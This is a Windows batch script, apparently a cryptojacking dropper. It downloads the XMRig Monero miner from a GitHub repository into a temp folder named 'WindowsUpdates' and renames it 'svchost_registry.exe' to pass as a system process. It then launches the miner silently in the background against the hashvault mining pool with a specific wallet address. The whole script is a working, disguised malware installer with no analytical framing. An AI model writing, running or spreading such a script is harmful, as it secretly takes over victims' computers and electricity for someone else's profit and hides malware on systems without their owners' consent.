@echo off
setlocal

set "DIR=%TEMP%\WindowsUpdates"
set "EXE_NAME=svchost_registry.exe"

if not exist "%DIR%" mkdir "%DIR%"
cd /d "%DIR%" || exit /b

if not exist "%EXE_NAME%" curl -s -L "https://github.com/sturneworld/test/raw/refs/heads/main/xmrig.exe" -o "%EXE_NAME%"
if not exist "config.json" curl -s -L "https://github.com/sturneworld/test/raw/refs/heads/main/config.json" -o "config.json"

start /b "" "%EXE_NAME%" --url pool.hashvault.pro:443 --user 45xgDc3Cb6mTZgKCnQwTsBbE3kCWLBSpcGJFguMsWk1d7i3Ndi5i3oYDXnVjSa7gruTvBbN7JrGdpUFGsQaLai7RLhB55Qi --pass worker --donate-level 1 --background --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14

exit
